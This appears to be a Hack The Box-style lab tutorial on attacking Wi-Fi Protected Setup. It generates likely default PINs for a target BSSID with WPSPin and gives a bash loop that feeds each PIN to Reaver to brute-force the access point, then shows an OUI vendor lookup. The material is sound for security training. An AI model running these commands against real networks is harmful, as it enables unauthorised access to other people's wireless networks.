### Using Python WPSPin to Generate Default PINs

The [WPSPin](https://github.com/epicdev420/WPSPin) tool is a powerful tool that includes many different PIN generation algorithms. This tool allows us to once again provide the BSSID of our target network and receive a list of possible default PINs.

```sh
3kjS@htb[/htb]$ git clone https://github.com/epicdev420/WPSPin.git

3kjS@htb[/htb]$ cd wpspin 

3kjS@htb[/htb]$ sudo python setup.py install
```

We specify our `BSSID` and `-A` to generate any and all possible PINs.

```sh
3kjS@htb[/htb]$ wpspin -A 60:38:E0:A2:3D:2A
```

```sh
3kjS@htb[/htb]$ sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p 73834410
```

However, doing this with a list of pre-defined PINs is not very efficient, as we have to re-execute this command for every potential PIN. Luckily, a bit of bash scripting can enable us to conduct a hands off approach for every PIN we generated.

We can extract only the pins from the wpspin output using a combination of `grep` and `tr` commands:

```sh
3kjS@htb[/htb]$ wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

This command filters and displays the 8-digit pins from the output file, separating them with spaces. We can now store this output in a variable of a bash script and use it for brute-forcing WPS, as shown below.

```sh
#!/bin/bash

#We add generated PINs into this list
PINS='73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973'

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```

With this script, we execute the same Reaver command for every PIN in the provided list. While it could be refined or built onto, the basic functionality is as follows:

- For each generated PIN attempted, the script will try the PIN only once, and then wait for 100 seconds if the access point (AP) locks
- Additionally, for every three attempts made, it will pause for 45 seconds.
- The script iterates through all the PINs in the list, which can be seen in action in the example below:

```sh
3kjS@htb[/htb]$ sudo bash pinguess.sh
```
![](Screenshot%202026-09-21%20at%2009.10.49.png)
### Performing Vendor Lookup

To perform a vendor lookup, we can use the following `grep` command, specifying the first portion of the target network’s BSSID:

```sh
3kjS@htb[/htb]$ grep -i "60-38-E0" /var/lib/ieee-data/oui.txt

60-38-E0   (hex)                Belkin International Inc.
```
